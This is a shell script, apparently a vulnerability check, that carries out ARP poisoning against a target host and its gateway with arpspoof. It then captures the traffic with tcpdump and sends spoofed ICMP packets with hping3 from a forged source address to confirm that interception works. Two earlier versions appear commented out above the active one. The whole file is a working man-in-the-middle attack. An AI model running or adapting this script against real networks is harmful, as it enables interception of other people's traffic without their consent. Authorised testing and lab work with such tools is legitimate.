# !/bin/bash

# TARGET_IP=$1
# INTERFACE=$2


# GATEWAY_IP=$(ip route | awk '/default/ {print $3; exit}')
# echo "Gateway = " $GATEWAY_IP

# if [ -z "$GATEWAY_IP" ]; then
#   echo "Could not determine the gateway address"
#   exit 1
# fi


# # Step 4: Perform arpspoof attack on the above IP address
# echo "Starting ARP spoofing attack on $TARGET_IP via gateway $GATEWAY_IP on interface $INTERFACE"
# sudo arpspoof -i $INTERFACE -t $TARGET_IP -r $GATEWAY_IP & ARP_PID=$! &> /dev/null &

# # Allow some time for arpspoof to take effect
# sleep 5

# # Step 5: Check if arpspoof attack is successful by capturing packets
# echo "Checking for captured packets..."
# #sudo tcpdump -i $INTERFACE -n "host $TARGET_IP and host $GATEWAY_IP" -c 10
# sudo tcpdump -q -i $INTERFACE -n "host $TARGET_IP and host $GATEWAY_IP" -c 5 2>/dev/null


# # Check if tcpdump captured packets
# if [ $? -eq 0 ]; then
#   echo "ARP spoofing attack is possible. Captured packets:"
#   sudo tcpdump -i $INTERFACE -n "host $TARGET_IP and host $GATEWAY_IP" -c 5
# else
#   echo "ARP spoofing attack is not possible."
# fi

# # Clean up by killing the arpspoof process
# kill $ARP_PID 2>/dev/null

# # Step 6: Display packets as proof if the attack is successful
# if [ $? -eq 0 ]; then
#   echo "Displaying captured packets:"
#   sudo tcpdump -i $INTERFACE -n "host $TARGET_IP and host $GATEWAY_IP" -c 5
# fi


















# !/bin/sh
# ip_addr=$1
# interface=$2
# gateway="$(ip route | grep $interface | grep default | awk '{print $3}')"
# echo "Gateway = " $gateway
# packet="$(sudo timeout 50s tcpdump &> test.txt &)"
# poison="$(sudo arpspoof -i $interface -t $ip_addr -r $gateway &> /dev/null &)"   # run in the background
# sleep 60  # sleep for a bit
# k="$(sudo killall arpspoof)"
# kill %1  # send SIGTERM to the command if it's still running
# sleep 60
# output="$(cat test.txt | grep -w $ip_addr | grep -w $gateway -m 1)"
# # echo "cat test.txt | grep -w $ip_addr | grep -w $gateway"
# echo $output
# if [ "$output" != '' ]
# then
# 	echo "$output"
# else
# 	echo "Not Possible"
# fi
# # output="$(sudo rm test.txt)"



# !/bin/sh
ip_addr=$1
interface=$2
gateway="$(ip route | grep $interface | grep default | awk '{print $3}')"
echo "Gateway = " $gateway

poison="$(sudo arpspoof -i $interface -t $gateway -r $ip_addr &> /dev/null &)"   # run in the background
sleep 5
capturing="$(sudo tcpdump -i $interface icmp &> test.txt &)"
sleep 5
spoofingReq="$(sudo hping3 -a '172.31.2.4' $ip_addr -1 &> /dev/null &)"

sleep 60

output="$(cat test.txt | grep -a -w "ICMP echo reply" | grep -w $ip_addr | grep -w '172.31.2.4' -m 1)"

if [ "$output" != '' ]
then
	echo "ARP Poisoning Successfully Possible."
	echo $output
else
	echo "Not Possible"
fi
output="$(sudo rm test.txt)"
